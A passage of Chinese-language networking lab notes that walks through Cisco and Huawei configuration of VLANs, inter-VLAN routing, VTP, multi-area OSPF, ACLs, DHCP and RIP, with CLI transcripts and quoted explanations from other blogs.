SAID MTU Parent RingNo BridgeNo Stp BrdgMode Trans1 Trans2</p><hr><p>1 enet 100001 1500 - - - - - 0 0<br>2 enet 100002 1500 - - - - - 0 0<br>3 enet 100003 1500 - - - - - 0 0<br>1002 fddi 101002 1500 - - - - - 0 0<br>–More–</p></blockquote><blockquote><p>三层交换机<br><strong>Switch&gt;en</strong><br><strong>Switch#conf t</strong><br>Enter configuration commands, one per line. End with CNTL/Z.</p><p><strong>Switch(config)#vlan 2</strong><br><strong>Switch(config-vlan)#exit</strong><br><strong>Switch(config)#vlan 3</strong><br><strong>Switch(config-vlan)#exit</strong></p><p><strong>Switch(config)#int fa 0/1</strong><br><strong>Switch(config-if)#switchport trunk encapsulation dot1q</strong><br><strong>Switch(config-if)#switchport mode trunk</strong><br><strong>Switch(config-if)#switchport trunk allowed vlan 2,3</strong><br><strong>Switch(config-if)#exit</strong></p><p><strong>Switch(config)#int fa 0/2</strong><br><strong>Switch(config-if)#switchport access vlan 2</strong><br><strong>Switch(config-if)#exit</strong></p><p><strong>Switch(config)#int vlan 2</strong></p><p>%LINK-5-CHANGED: Interface Vlan2, changed state to up</p><p>%LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan2, changed state to up<br><strong>Switch(config-if)#ip address 192.168.1.1 255.255.255.0</strong><br><strong>Switch(config-if)#no shutdown</strong><br><strong>Switch(config-if)#exit</strong><br>Switch(config)#int vlan 3</p><p>%LINK-5-CHANGED: Interface Vlan3, changed state to up</p><p>%LINEPROTO-5-UPDOWN: Line protocol on Interface Vlan3, changed state to up<br>Switch(config-if)#ip address 192.168.2.1 255.255.255.0<br>Switch(config-if)#no shutdown<br>Switch(config-if)#exit</p><p><strong>Switch(config)#ip routing</strong><br><strong>Switch(config)#exit</strong><br>Switch#<br>%SYS-5-CONFIG_I: Configured from console by console</p><p><strong>Switch#show ip route</strong><br>Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br>D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br>N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br>E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br>i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area</p><ul><li><ul><li>candidate default, U - per-user static route, o - ODR<br>P - periodic downloaded static route</li></ul></li></ul><p>Gateway of last resort is not set</p><p>C 192.168.1.0/24 is directly connected, Vlan2<br>C 192.168.2.0/24 is directly connected, Vlan3</p><p><strong>Switch#show vlan</strong></p><p>VLAN Name Status Ports</p><hr><p>1 default active Fa0/3, Fa0/4, Fa0/5, Fa0/6<br>Fa0/7, Fa0/8, Fa0/9, Fa0/10<br>Fa0/11, Fa0/12, Fa0/13, Fa0/14<br>Fa0/15, Fa0/16, Fa0/17, Fa0/18<br>Fa0/19, Fa0/20, Fa0/21, Fa0/22<br>Fa0/23, Fa0/24, Gig0/1, Gig0/2<br>2 VLAN0002 active Fa0/2<br>3 VLAN0003 active<br>1002 fddi-default act/unsup<br>1003 token-ring-default act/unsup<br>1004 fddinet-default act/unsup<br>1005 trnet-default act/unsup</p><p>VLAN Type SAID MTU Parent RingNo BridgeNo Stp BrdgMode Trans1 Trans2</p><hr><p>1 enet 100001 1500 - - - - - 0 0<br>2 enet 100002 1500 - - - - - 0 0<br>3 enet 100003 1500 - - - - - 0 0<br>1002 fddi 101002 1500 - - - - - 0 0<br>–More–</p></blockquote><blockquote><p>PC1 分别 ping PC2 和 PC3</p><p> <strong>PC&gt;ipconfig IP</strong></p><p>Address………………….: 192.168.1.2 </p><p>Subnet Mask…………………: 255.255.255.0 </p><p>Default Gateway……………..: 192.168.1.1 </p><p><strong>PC&gt;ping 192.168.2.2</strong> </p><p>Pinging 192.168.2.2 with 32 bytes of data:</p><p> Request timed out. </p><p>Reply from 192.168.2.2: bytes=32 time=25ms TTL=127 </p><p>Reply from 192.168.2.2: bytes=32 time=20ms TTL=127 </p><p>Reply from 192.168.2.2: bytes=32 time=20ms TTL=127 </p><p>Ping statistics for 192.168.2.2: </p><p>Packets: Sent = 4, Received = 3, Lost = 1 (25% loss), Approximate round trip times in milli-seconds: Minimum = 20ms, Maximum = 25ms, Average = 21ms</p></blockquote><pre class="line-numbers language-none"><code class="language-none">2.拓展任务使用VTP管理交换机启用快速生成树，采用线路冗余的方式增加可靠性。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://www.cnblogs.com/zoulongbin/p/9047390.html">https://www.cnblogs.com/zoulongbin/p/9047390.html</a></p><p>VTP的工作原理</p><p>VTP：虚拟局域网中继协议，VTP是一种消息协议，它使用第二层帧，<strong>在交换机之间传递VLAN信息</strong>，被称为VTP通告。<strong>有了VTP通告就可以再一台交换机上集中修改VLAN配置，所做的修改会被自动传播到网络中的其他交换机，从而实现VLAN配置的一致性。</strong></p><p>VTP域：也称为VLAN管理域，由一个以上共享VTP域名相连接的交换机组成。也就是说，VTP域是一组VTP域名相同并通过中继链路互相连接的交换机。使用VTP首先需要建立一个VTP管理域，在同一管理域中的交换机共享他们的VLAN信息，并且<strong>一个交换机只能参加一个VTP管理域</strong>。</p><p>配置VTP域的要求如下：</p><p>1、域内的每台交换机都必须使用相同的VTP域名。</p><p>2、交换机必须是相邻的，即相邻的交换机并具有相同的域名。</p><p>3、交换机之前必须配置中继链路(也就是Trunk)。</p><p>它不通告自己的VLAN配置信息，对收到的VTP通告只转发而不会学习与更改自己的VLAN信息。</p></blockquote><blockquote><p>VTP的模式</p><p>1、服务器模式：充当VTP服务器模式的交换机负责它所在域中VLAN信息的管理工作。VTP服务器可以创建、删除或修改VLAN，并向外发送VTP通告，同时，VTP服务器也会学习域名相同的VTP通告信息。</p><p>2、客户机模式：处于VTP客户机模式的交换机不允许管理创建，删除或修改VLAN。它们监听本域中其他交换机的VTP通告，并相应修改它们自己的VTP配置。</p><p>3、透明模式：VTP透明模式中的交换机不参与VTP。当交换机处于透明模式时，它可以创建，删除或修改本地的VLAN信息，但</p></blockquote><blockquote><p>VTP通告</p><p>使用VTP时，加入VTP域的每台交换机在其中继端口上通告如下信息：</p><p>1、管理域 (即VTP的域名信息)</p><p>2、版本号 (使用VTP的版本号，只要校验服务器和客户机模式的版本是否一致)</p><p>3、配置修改编号 (默认为0，当修改VTP域的配置之后，此编号会加1)</p><p>4、它所知道的VLAN (即VTP中的所有VLAN)</p><p>5、每个VLAN的某些参数 (vlan的相关信息)</p><p>注意：当一台修改编号高于此VTP域中的修改编号的交换机加入此VTP域时，此交换机的中的VLAN配置会覆盖所有VTP域中的VLAN配置，所以将交换机加入VTP域时要格外小心。我们可以将交换机的VTP模式改为透明模式，再改回服务器模式或交换机模式，或者是将交换机的域名更改一下在改回来，就可以将交换机的修改编号初始为0。</p></blockquote><blockquote><p>VTP修剪</p><p>VTP修剪是VTP的一个功能，它能减少中继链路上不必要的广播流量。</p></blockquote><blockquote><p>配置VTP实例</p><p>在配置VTP之前，我们需要将<strong>VTP服务器和VTP客户机之间的链路设置为中继链路</strong>。</p><p>列如：将Switch1和Switch2的24号端口设置为trunk中继链路。</p><p>Switch1(config)#int f0/24</p><p>Switch1(config)#switchport mode trunk</p><p>Switch1(config)#no sh</p><p>Switch2(config)#int f0/24</p><p>Switch2(config)#switchport mode trunk</p><p>Switch2(config)#no sh</p><p>配置VTP服务器模式</p><p>列如：将Switch1配置为VTP服务器，域名为test，秘密为123，配置VTP修剪。</p><p>Switch1#config terminal</p><p>Switch1(config)#vtp domain test</p><p>Switch1(config)#vtp mode server</p><p>SWitch1(config)#vtp passwd 123</p><p>Switch1(config)#vtp pruning</p><p>配置VTP客户机模式</p><p>列如：将Switch2配置为VTP客户机，域名和密码必须和服务器器一致，否则将不匹配。</p><p>Switch2#config terminal</p><p>Switch2(config)#vtp domain test</p><p>Switch2(config)#vtp mode client</p><p>SWitch2(config)#vtp passwd 123</p><p>Switch2(config)#vtp pruning</p><p>此时VTP服务器和VTP客户端就配置完成了，现在只需要在VTP服务器端创建VLAN，VTP客户端就可以自动学习到服务器端创建的VLAN，而不需要自己创建VLAN，但是注意，虽然VTP客户端可是自动学习VLAN，但是将端口加入VLAN的动作是不可以学习的，所以在客户端需要手动将端口添加到相应的VLAN中。</p></blockquote><blockquote><p>Unable to perform trunk negotiation on port Fa0/23 because of VTP domain mismatch这句话是什么意思？？是不能开启trunk在f0/23上！！因为VTP的域名错了！！你VTP配置的时候是不是名字有问题？？要就是配置一个！！要就是两边一样的！！不要两边不一样的！</p></blockquote><h2 id="实训2-多域OSPF"><a href="#实训2-多域OSPF" class="headerlink" title="实训2 多域OSPF"></a>实训2 多域OSPF</h2><pre class="line-numbers language-none"><code class="language-none">要求：配置多域OSPF；Loopback口相当于PC；基本配置内容自主网络搜索。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>OSPF多用于大型IPv4网络，是基于链路状态的路由协议，与基于距离矢量的路由协议相比具有更快的收敛速度，支撑的网络规模也更大。</p><p>OSPF（Open Shortest Path First）是IETF组织开发的一个基于链路状态的内部网关协议。目前针对IPv4协议使用的是OSPF Version 2（RFC2328）。OSPF是不属于任何一个厂商或组织私有的路由协议，使用Dijkstra的最短路径（SPF）算法计算路由。在OSPF中引入了区域的概念，有效的减少了路由选择协议对路由器CPU和内存的占用，同时也降低了路由选择协议的通信量，使得构建大型层次化网络成为可能</p></blockquote><blockquote><p><strong>duplex auto</strong> 是双工的协商模式为自动<br>双工模式有两种，一种是full（全双工），一种是half（半双工）<br><strong>speed auto</strong> 是速率为协商模式为自动<br>一般的100M口支持: 10M，100M和自动模式</p><p>选择为自动模式则接口会和对端设备的接口进行协商，并自动选择最佳模式。</p></blockquote><blockquote><p><strong>#ip access-group 10 out</strong></p><p>将列表10所定义的条件应用禁止从此接口出去</p><p>该命令的详细说明如下：<br>ip access-group {[access-list-number] |[ name]} [in | out]<br>no ip access-group {[access-list-number] |[ name]} [in | out]</p><p>功能：将指定的访问列表应用到相关接口，并且指定acl起作用的方向。本命令的no操作为解除访问列表应用到相关接口，若没有指定方向，则默认为out；<br>若没有指定具体的[access-list-number] 或[name]而指定了方向，则默认为删除该方向上所有的访问列表的应用；若没有指定具体的[access-list-number] 或[name]也没有指定方向，则默认为删除out方向上所有的访问列表的应用。</p><p>参数：[access-list-number]为访问表表号，取值范围1～199；[name]为由ip access-list 命令指定的访问表名字，最长不超过8个字符；in为过滤入口的包；out为过滤出口的包。</p><p>缺省情况：没有任何访问表被应用至任何接口。若指定了绑定，而未指定方向，缺省为out。</p><p>命令模式：接口配置模式</p><p>使用指南：在访问列表应用到具体接口的具体方向之前，访问列表的规则是不起作用的。每个接口定义两个方向，即in和out方向。前者代表流入接口的方向，<br>后者代表流出接口的方向。规则可单独对in或out方向起作用，即只过滤入口的包或只过滤出口方向上的包，也可以两个方向都过滤。</p><p>应用到接口上的访问列表可以有多条，但只能有一条标准访问列表，对扩展访问列表来说，一个接口一个方向相同协议的访问列表只能有一条。访问列表的协议是指</p><p>每个表的协议缺省为这个表的第一条规则中指定要过滤的协议。若通过的信息包符合多条规则，则只有匹配的第一条规则有作用，匹配的顺序与规则应用到接口的先<br>后顺序一致。若规则中含有相互冲突的设置，以第一条匹配到的规则为准。</p><p>在当前时间不在分段时间过滤访问表设定的时间段时，将分段时间过滤访问表应用到接口是不起作用的，但等时间进入设定的时间段后，曾经应用到接口的分段时间过滤访问表会自动生效。</p></blockquote><p><img src="https://img-blog.csdn.net/20160629191708718?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img"></p><blockquote><p><strong>router ospf 10</strong></p><p>Router ospf 10 中的 10 是这台<a href="https://so.csdn.net/so/search?q=%E8%B7%AF%E7%94%B1%E5%99%A8&spm=1001.2101.3001.7020">路由器</a> Ospf 进程的 ID 号！<br>路由器和我们的PC一样，是多任务系统，理论上能够支持多个 OSPF 进程同时运行！此ID号仅本地有效！ <a href="https://so.csdn.net/so/search?q=SNMP&spm=1001.2101.3001.7020">SNMP</a> 是网络管理协议，OSPF<br>是路由协议，两者就不是一个东西，不能相提并论！</p><p><strong>log-adjacency-changes</strong></p><p><strong>log-adjacency-changes命令</strong>可用来激活路由协议邻接关系变化日志的功能（例如ospf或者ISIS等）。使用该命令来生成SYSLOG信息以用于网络操作与管理。日志信息对于故障排除也非常有用。log-adjacency-changes 是一个日志开关，意思是<strong>当 OSPF 探测到邻居关系发生变化时，将变化情况记录在系统日志里面</strong>！</p><p><strong>network 192.168.233.160 0.0.0.3 area 1</strong></p><pre class="line-numbers language-none"><code class="language-none">network 192.168.233.164 0.0.0.3 area 1 network 192.168.233.168 0.0.0.3 area 1 network 192.168.233.172 0.0.0.3 area 1 network 192.168.233.176 0.0.0.3 area 1 network 192.168.233.184 0.0.0.3 area 1 network 192.168.233.188 0.0.0.3 area 1 network 192.168.233.192 0.0.0.3 area 1 network 192.168.233.196 0.0.0.3 area 1 network 192.168.233.200 0.0.0.3 area 1 network 192.168.233.204 0.0.0.3 area 1network 10.228.1.0      0.0.0.15 area 1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是使用 OSPF 向邻居发布路由信息！ area 1 是 OSPF路由域中的 区域1，ospf 路由域分为骨干区域和非骨干区域，只有 area 0 是骨干区域，其他都是非骨干区域！<br>0.0.0.3表示： 反掩码，表示匹配反掩码为1的位<br>0.0.0.255实际上是0.0.0.1111 1111 只要192.168.2.xxxx xxxx的网段就应用该路由 我自己把反掩码中的0理解为固定位，1理解为自由位。固定位就是不能变的，自由位是能变的，其实就是对前面ip的修饰，固定位就是他的网络段</p><p>原文链接：<a href="https://blog.csdn.net/qq_31828929/article/details/71191679">https://blog.csdn.net/qq_31828929/article/details/71191679</a></p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c">PC与路由器的接口配置：interface FastEthernet0<span class="token operator">/</span><span class="token number">0</span> ip address <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.254</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span> duplex <span class="token keyword">auto</span>    speed <span class="token keyword">auto</span>    <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">30</span>条消息<span class="token punctuation">)</span> 思科实验之配置ACL_晚风挽着浮云的博客<span class="token operator">-</span>CSDN博客_思科配置acl<span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token comment">//blog.csdn.net/weixin_57636278/article/details/123912132)</span>                                              interface FastEthernet0<span class="token operator">/</span><span class="token number">0</span>ip address <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.254</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span>no shutdownexit                                              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">R1<span class="token operator">:</span>interface GigabitEthernet0<span class="token operator">/</span><span class="token number">0</span> ip address <span class="token number">172.16</span><span class="token number">.10</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span> no shutdown                          #开启接口exitrouter ospf <span class="token number">10</span>                        #开启ospf 进程号为<span class="token number">10</span>network <span class="token number">172.16</span><span class="token number">.10</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span> area <span class="token number">1</span>  #宣告直连的网段；网段的反掩码；其直连的网段属于area1区域R2<span class="token operator">:</span>interface GigabitEthernet0<span class="token operator">/</span><span class="token number">0</span> ip address <span class="token number">172.16</span><span class="token number">.10</span><span class="token number">.2</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span> no shuinterface GigabitEthernet0<span class="token operator">/</span><span class="token number">1</span> ip address <span class="token number">172.16</span><span class="token number">.20</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span> no shu exitrouter ospf <span class="token number">10</span> network <span class="token number">172.16</span><span class="token number">.10</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span> area <span class="token number">1</span>  #宣告直连，其直连的网段属于area1 区域 network <span class="token number">172.16</span><span class="token number">.20</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span> area <span class="token number">0</span>  #area0是骨干区域 R3： interface GigabitEthernet0<span class="token operator">/</span><span class="token number">0</span> ip address <span class="token number">172.16</span><span class="token number">.20</span><span class="token number">.2</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span> no shuinterface GigabitEthernet0<span class="token operator">/</span><span class="token number">1</span> ip address <span class="token number">172.16</span><span class="token number">.30</span><span class="token number">.1</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span> no shu exitrouter ospf <span class="token number">10</span> network <span class="token number">172.16</span><span class="token number">.20</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span> area <span class="token number">0</span> network <span class="token number">172.16</span><span class="token number">.30</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span> area <span class="token number">2</span> R4： interface GigabitEthernet0<span class="token operator">/</span><span class="token number">0</span> ip address <span class="token number">172.16</span><span class="token number">.30</span><span class="token number">.2</span> <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span> no shu exitrouter ospf <span class="token number">10</span> network <span class="token number">172.16</span><span class="token number">.30</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span> area <span class="token number">2</span>  show ip route ping <span class="token number">172.16</span><span class="token number">.30</span><span class="token number">.2</span>     https<span class="token operator">:</span><span class="token comment">//blog.csdn.net/zhangzc0408/article/details/124372279</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p> <strong>Loopback</strong>是路由器里面的一个逻辑接口。逻辑接口是指能够实现数据交换功能，但是物理上不存在、需要通过配置建立的接口。Loopback接口一旦被创建，其物理状态和链路协议状态永远是Up，即使该接口上没有配置IP地址</p><p>Loopback接口创建后一直保持UP状态，用户可通过配置Loopback接口达到提高网络可靠性的目的。</p><p><a href="https://blog.csdn.net/JackLiu16/article/details/80296461">(30条消息) Loopback接口的主要作用及Loopback端口配置_JackLiu16的博客-CSDN博客_交换机loopback接口</a></p><p><a href="https://blog.51cto.com/u_15624911/5287875">OSPF多域配置_wx627255bd4ac6d的技术博客_51CTO博客</a></p></blockquote><h2 id="实训3-路由交换综合"><a href="#实训3-路由交换综合" class="headerlink" title="实训3 路由交换综合"></a>实训3 路由交换综合</h2><pre class="line-numbers language-none"><code class="language-none">实训要求1.试验台环境：路由器为2811，交换机3560、2950；2.规划IP，配置接口，启动静态或动态路由协议，保障网络连通性；3.划分两个VLAN，VLAN 10采用192.168.10.0&#x2F;24，VLAN 20采用192.168.20.20；4.能够实现VLAN间路由；5.禁止VLAN 20中的主机访问WWW服务，但不禁止Ping （VLAN10中主机可以访问WWW）。6.VLAN 20需要配置DHCP。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200723091948207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDE4Njky,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><a href="https://blog.csdn.net/qq_44018692/article/details/107529914">(30条消息) 交换机与路由器的通信的配置（2020.7.15）_penguinhd的博客-CSDN博客</a></p><blockquote><p>SW13</p><p>Enable<br>Conf t<br>Vlan 10<br>Exit<br>Interface f0/1<br>Switchport access vlan 10<br>Exit<br>Interface f0/2<br>Switchport mode trunk </p></blockquote><blockquote><p>sw14</p><p>Enable<br>Conf t<br>Vlan 20<br>Exit<br>Interface f0/2<br>Switchport access vlan 20<br>Exit<br>Interface f0/1<br>Switchport mode trunk</p></blockquote><blockquote><p>sw12</p><p>enable<br>conf t<br>vlan 10<br>exit<br>vlan 20<br>interface range f0/1-3<br>switchport mode trunk </p></blockquote><blockquote><p>sw1</p><p>enable<br>conf t<br>vlan 10<br>exit<br>vlan 20<br>exit<br>interface f0/1<br>switchport tr en do<br>switchport mode trunk<br>exit<br>interface vlan 10<br>ip address 192.168.10.1 255.255.255.0<br>exit<br>interface vlan 20<br>ip address 192.168.20.1 255.255.255.0<br>exit<br>ip routing</p><p>Switch(config)#interface f0/2<br>Switch(config-if)#no switchport（使其成为路由器接口）<br>Switch(config-if)#ip address 192.168.30.1 255.255.255.0</p></blockquote><blockquote><p>route 4</p><p>enable<br>config t<br>interface f0/0<br>no shutdown<br>ip address 192.168.30.2 255.255.255.0<br>exit<br>interface f0/1<br>no shutdown<br>ip address 192.168.40.1 255.255.255.0</p></blockquote><blockquote><p>route 5</p><p>enable<br>conf t<br>interface f0/0<br>no shutdown<br>ip address 192.168.40.2 255.255.255.0<br>exit<br>interface f0/1<br>no shutdown<br>ip address 192.168.50.1 255.255.255.0</p></blockquote><blockquote><p><strong>什么是ACL？</strong></p><p>ACL全称访问控制列表（Access Control List），主要通过配置一组规则进行过滤路由器或交换机接口进出的数据包，</p><p>是<strong>控制访问的一种网络技术手段</strong>， ACL适用于所有的被路由支持的协议，如IP、tcp、udp、ftp、www等。</p><p><strong>什么是反掩码？</strong></p><p>反掩码就是通配符掩码 ， 通过标记0和1告诉设备应该匹配到哪位。 在反掩码中，相应位为1的地址在比较中忽略，</p><p>为0的必须被检查。IP地址与反掩码都是32位的数 由于跟子网掩码刚好相反，所以也叫反掩码 。</p><p>路由器使用的通配符掩码与源或目标地址一起来分辨匹配的地址范围，它与子网掩码不同。它不像子网掩码告诉</p><p>路由器IP地址是属于哪个子网（网段），通配符掩码告诉路由器为了判断出匹配，它需要检查IP地址中的多少位。</p><p>例如：</p><p>255.255.255.0 反掩码（wildcard-mask）就是0.0.0.255</p><p>255.255.255.248 反掩码（wildcard-mask）就是0.0.0.7</p><p><strong>ACL工作原理：</strong></p><p>ACL使用包过滤技术，在路由器上读取OSI七层模型的第3层和第4层包头中的信息。如源地址，目标地址，源端口，目标端口等，根据预先定义好的规则，对包进行过滤，从而达到访问控制的目的。</p><p>对于路由器接口而言，ACL是有两个方向：</p><p><strong>注意：</strong>如果发现没有匹配的ACL规则，默认会丢弃该数据包，思科ACL规则默认会有一条隐藏的deny any any规则，而华三ACL规则默认是permit any any规则。</p><p>**入站—-**如果是入站访问列表，则当路由器接收到数据包时，Cisco IOS 软件将检查访问列表中的条件语句，看是否有匹配。如果数据包被允许，则软件将继续处理该数据包。如果数据包被拒绝，则软件会丢弃该数据包。</p><p>**出站—-**如果是出站访问列表，则当软件到接收数据包并将群其路由至出站接口后，软件将检查访问列表中的条件语句，看是否有匹配。如果数据包被允许，则软件会发送该数据包。如果数据包被拒绝，则软件会丢弃该数据包。</p><p><img src="https://images2018.cnblogs.com/blog/435896/201805/435896-20180516175614455-864140199.png" alt="img"></p><p><strong>ACL两种类型：</strong></p><p><strong>标注：</strong>允许在标准ACL和扩展ACL中使用名称代替访问控制列表号。</p><p><strong>1、 标准的ACL</strong></p><p>根据数据包的源IP地址来控制允许转发或拒绝数据包，访问控制列表号1~99。</p><p>标准访问控制列表配置命令如下：</p><p>Router(config)#access-list access-list-number {permit|deny} source [souce-wildcard]</p><p>或者</p><p>Router(config)#ip access-list standard access-list-number</p><p>Router(config-std-nacl)#Sequence Number{permit|deny} source [souce-wildcard]</p><p>下面是命令参数的详细说明</p><p>access-list-number：访问控制列表号，标准ACL取值是1-99，可以使用名称替代列表号。</p><p>Sequence Number：每条ACL规则列表序列号，可使用范围1-2147483647。</p><p>permit | deny：如果满足规则，则允许/拒绝通过。</p><p>source：数据包的源地址，可以是主机地址，也可以是网络地址</p><p><strong>2、 扩展的ACL</strong></p><p>根据数据包的源IP地址、目的IP地址、指定协议，端口、标志和时间来控制允许转发或拒绝数据包，访问控制列表号100~199</p><p>扩展访问控制列表配置命令如下：</p><p>Router(config)#access-list access-list-number {permit|deny} protocol {source souce-wildcard destination destination-wildcard} [operator operan]</p><p>或者</p><p>Router(config)#ip access-list extended access-list-number</p><p>Router(config-std-nacl)#{permit|deny} protocol {source souce-wildcard destination destination-wildcard} [operator operan]</p><p>下面是命令参数的详细说明</p><p>access-list-number：访问控制列表号，扩展ACL取值100-199，可以使用名称替代列表号。</p><p>Sequence Number：每条ACL规则列表序列号，可使用范围1-2147483647。</p><p>permit|deny：如果满足规则，则允许/拒绝通过。</p><p>protocol：用来指定协议的类型，如IP，TCP，UDP，ICMP等。</p><p>source、destination：源和目的，分别用来标示源地址和目的地址。</p><p>souce-wildcard、destination-wildcard：子网反码，souce-wildcard是源反码，destination-wildcard是目标反码。</p><p>operator operan：lt(小于)、gt(大于)、eq(等于)、neq(不等于)、rand(范围端口号)等。</p></blockquote><blockquote><p><strong>DHCP</strong></p><p>​    DHCP全称为Dynamic Host Configuration Protocol，中文含义为“动态主机配置协议”，通常被应用在大型的局域网络环境中，主要作用是集中管理、分配IP地址，使网络环境中的主机动态获得IP地址、Gateway地址、<a href="https://product.pconline.com.cn/itbk/wlbg/network/1305/3304121.html">DNS</a>服务器地址等信息，并能够提升地址的使用率。</p><p>　DHCP协议采用客户端/服务器模型，主机地址的动态分配任务由网络主机驱动。当DHCP服务器接收到来自网络主机申请地址的信息时，才会向网络主机发送相关的地址配置等信息，以实现网络主机地址信息的动态配置。</p><p>​    <strong>DHCP服务器</strong>就是自动给电脑分配IP地址和子网掩码的服务器。比如我们设置了路由器的DHCP服务器，让DHCP服务器自动分配IP地址，从<a href="https://product.pconline.com.cn/itbk/wlbg/network/1403/4387067.html">192.168.1.1</a>00到192.168.1.199(子网掩码会自动设置，我们无需设置)。</p></blockquote><h2 id="实训4-RIP一般配置方法"><a href="#实训4-RIP一般配置方法" class="headerlink" title="实训4 RIP一般配置方法"></a>实训4 RIP一般配置方法</h2><blockquote><p>RIP（Routing　Information protocol) 路由信息协议.<br>是一种内部网关协议（IGP），是一种动态路由选择协议，用于自治系统（AS）内的路由信息的传递。RIP协议基于距离矢量算法（DistanceVectorAlgorithms），使用“跳数”(即metric)来衡量到达目标地址的路由距离。RIP通过UDP报文进行路由信息交换,使用的端口号为520.</p><p>这种协议的路由器<strong>只关心自己周围的世界，只与自己相邻的路由器交换信息，范围限制在15跳(15度)之内</strong>，再远，它就不关心了。RIP应用于OSI网络七层模型的应用层。各厂家定义的管理距离（AD，即优先级）如下：华为定义的优先级是100，思科定义的优先级是120。</p></blockquote><blockquote><p>第一步：将每个设备的IP地址配好</p><p>Router#configure terminal<br>Enter configuration commands, one per line.  End with CNTL/Z.<br>Router(config)#interface g0/0<br>Router(config-if)#ip address 192.168.1.1 255.255.255.0<br>Router(config-if)#no shutdown<br>Router(config-if)#exit<br>Router(config)#interface Se0/3/0<br>Router(config-if)#ip address 10.0.0.1 255.0.0.0<br>Router(config-if)#no shutdown<br>Router(config-if)#end<br>Router#<br>%SYS-5-CONFIG_I: Configured from console by console</p><p>Router#</p></blockquote><blockquote><p>第二步：配置rip路由</p><p>Router(config)#hostname R0<br>R0(config)#end<br>R0#<br>%SYS-5-CONFIG_I: Configured from console by console<br>R0#configure terminal<br>Enter configuration commands, one per line.  End with CNTL/Z.<br>R0(config)#route rip<br>R0(config-router)#network 192.168.1.0<br>R0(config-router)#network 10.0.0.0<br>R0(config-router)#end</p></blockquote><h2 id="实训5-华为交换初步"><a href="#实训5-华为交换初步" class="headerlink" title="实训5 华为交换初步"></a>实训5 华为交换初步</h2><pre class="line-numbers language-none"><code class="language-none">实训目的：了解VLAN的划分方法；了解VLAN特性；了解Trunk的配置方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/sizaif/article/details/78281112">(30条消息) 二层交换机实现vlan 功能 (Cisco Packer Tracer 模拟器)_sizaif的博客-CSDN博客</a></p><p><img src="https://img-blog.csdn.net/20171019103159363?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2l6YWlm/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="img"></p><blockquote><p>主机配置：</p><p>Switch&gt;en<br>Switch#conf<br>Switch(config)#vlan 10 // 创建 vlan 10<br>Switch(config-vlan)#vlan 20 // 创建 vlan 20<br>Switch(config-vlan)#EXIT<br>Switch(config-if)#interface fa0/1  // 进入端口 f0/1 并配置为接入到vlan10 的access 模式<br>Switch(config-if)#switchport mode access<br>Switch(config-if)#switchport  access  vlan 10<br>Switch(config-if)#interface fa0/2  //进入端口 f0/2 并配置为接入到vlan20 的access 模式<br>Switch(config-if)#switchport mode access<br>Switch(config-if)#switchport  access  vlan 20</p></blockquote><blockquote><p>交换机配置：</p><p>Switch&gt;en<br>Switch#conf<br>Switch(config)#interface fa0/24 // 进入端口f0/24  并设置为trun 模式，允许所以vlan通过<br>Switch(config-if)#switchport mode access<br>Switch(config-if)#switchport mode 